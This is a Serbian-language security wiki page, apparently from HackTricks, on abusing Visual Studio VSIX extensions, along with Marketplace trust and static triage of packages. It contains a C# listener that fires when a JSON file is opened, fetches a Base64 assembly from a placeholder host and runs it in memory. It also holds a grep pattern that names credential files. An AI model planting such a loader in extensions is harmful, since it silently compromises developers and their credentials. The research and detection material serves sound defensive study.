# Zloupotreba VSIX ekstenzija za Visual Studio

{{#include ../banners/hacktricks-training.md}}

Ekstenzija za Visual Studio može da pretvori uobičajenu aktivnost u editoru u izvršavanje koda pod identitetom prijavljenog korisnika. Zlonamerni VSIX, izdavač koji se predstavlja kao drugi ili kompromitovano ažuriranje ekstenzije mogu doći do korisnika uobičajenim kanalima za instalaciju. Instalacija koja zahteva administratorski upit predstavlja instalaciju uz pristanak, a ne automatsko podizanje privilegija.<sup>[[1]](#references)</sup>

## Model izvršavanja

Klasične VSSDK ekstenzije obično se izvršavaju unutar procesa `devenv.exe`. Noviji model `VisualStudio.Extensibility` uglavnom pokreće moderne .NET ekstenzije van procesa: Visual Studio posreduje u pozivima ka namenskom procesu `Microsoft.ServiceHub.Host.Extensibility`, čime se izoluje stabilnost IDE-a, ali se ekstenzija **ne** ograničava sandboxom u odnosu na Windows dozvole korisnika. Tačan naziv izvršne datoteke može da sadrži sufiks za arhitekturu, kao što je `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Aktiviranje uobičajenom aktivnošću u editoru

Umesto da izlaže samo upadljivu komandu u meniju, ekstenzija može da implementira `ITextViewOpenClosedListener`. Njen povratni poziv `TextViewOpenedAsync` poziva se za dokumente koji ispunjavaju uslove, dok `TextViewExtensionConfiguration.AppliesTo` može da ograniči aktiviranje na uobičajen tip, kao što je JSON. Pravi formatter ili linter i dalje može da obavlja oglašenu funkciju dok se druga radnja izvršava kao sporedni efekat otvaranja datoteke.<sup>[[1]](#references)[[3]](#references)</sup>

Sledeći pojednostavljeni obrazac prikazuje važne tačke izvršavanja; radi jasnoće, izostavlja legitimni formatter i obradu grešaka.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Učitavač upravljanih sklopova u memoriji, pokrenut događajem</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Ovaj lanac preuzima Base64 tekst, dekodira ga u bajtove assembly-ja, učitava ga iz `MemoryStream` objekta pomoću uklonjivog `AssemblyLoadContext` konteksta, poziva reflektovani `EntryPoint` bez parametara ili sa `string[]` nizom, čeka asinhrone ulazne tačke i uklanja kontekst. Druga faza se ne zapisuje na disk, iako VSIX i primarna DLL datoteka proširenja ostaju artefakti na disku. Base64 ne pruža autentičnost ni poverljivost; korišćenje HTTP-a takođe omogućava napadaču na putanji da zameni odgovor.<sup>[[1]](#references)</sup>

Operativne varijacije uključuju potiskivanje svih izuzetaka kako bi oglašena funkcija nastavila da radi u slučaju neuspešnog postavljanja ili korišćenje `ITextViewChangedListener` za pokretanje nakon izmena. Kod se izvršava u hostu proširenja i može da koristi upravljane API-je, P/Invoke, datoteke, akreditive i podređene procese koji su dostupni tom korisniku.<sup>[[1]](#references)</sup>

Za povezanu površinu za izvršavanje specifičnu za uređivač, zasnovanu na automatskom učitavanju izvornog dodatka, pogledajte:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Zloupotreba poverenja u Marketplace i kanale distribucije

VSIX može stići kao direktno deljena ili phishing datoteka, sa veb Marketplace-a ili putem ugrađenog Marketplace pregledača u Visual Studio-u. Registracija izdavača, koja uglavnom obezbeđuje jedinstvenost i listu rezervisanih reči, može da omogući identitete izdavača koji vizuelno podsećaju na druge; kompromitovanje već pouzdanog izdavača ili proširenja još je efikasnije jer nasleđuje postojeću bazu instaliranih korisnika. Instalacija sa Marketplace-a pokreće Visual Studio Installer i privremeno smešta preuzeti VSIX u `%LOCALAPPDATA%\Temp`; `payload.vsix` se takođe legitimno koristi, pa samo ime datoteke nije pokazatelj.<sup>[[1]](#references)</sup>

MDSec nije identifikovao URL protokol za Visual Studio koji direktno instalira proširenje. Operateru je i dalje potrebno da korisnik instalira ili odobri poverenje VSIX-u, ili mora da kompromituje postojeći kanal distribucije proširenja. Paket `AllUsers` instalira se u fasciklu za instalaciju Visual Studio-a i može zatražiti povišene privilegije, ali to je uobičajeno ponašanje instalatora uz pristanak korisnika, a ne automatski način za dobijanje administratorskih privilegija ili SYSTEM pristupa.<sup>[[1]](#references)[[4]](#references)</sup>

### Statička analiza velikog broja paketa

VSIX paketi su obično ZIP kontejneri, pa bezbedan proces za pregled Marketplace paketa može da ih nabroji, raspakuje **bez učitavanja koda proširenja**, analizira manifeste, identifikuje površine za izvršavanje i dekompajlira upravljane assembly-je pomoću `ilspycmd`. Dajte prednost assembly-jima koje poseduje proširenje, nakon što isključite uobičajene priložene zavisnosti, a zatim povežite nizove koji se odnose na skladišta akreditiva sa grupama ponašanja kao što su čitanje datoteke i slanje preko mreže, kodiranje i slanje, preuzimanje i izvršavanje, upravljač akreditivima i mrežni pristup ili snimak ekrana i slanje.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Takođe popišite nativne DLL-ove, MSBuild targets, skripte, T4 templates i sadržaj instalacionih paketa, umesto da pretpostavite da se svaka površina za izvršavanje sastoji od managed code-a. Uporedite sumnjivo ponašanje sa namenom navedenom u manifestu; telemetrija i legitimni programi za ažuriranje mogu ličiti na eksfiltraciju ili pripremu sadržaja. Pregled samo statičke analize propušta upakovani, obfuskovani, dinamički razrešeni i neaktivni kod, a pregled samo najnovije verzije propušta zlonamerna starija izdanja.<sup>[[1]](#references)</sup>

Zaseban napad pri učitavanju projekta može da izvrši zlonamerni [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md) bez instaliranja VSIX-a.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Ponovni osvrt na Visual Studio ekstenzije](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - O VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Struktura VSIX paketa](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - .NET alat ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Kampanja Blinder Tunnel cilja infrastrukturu u Iraku](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
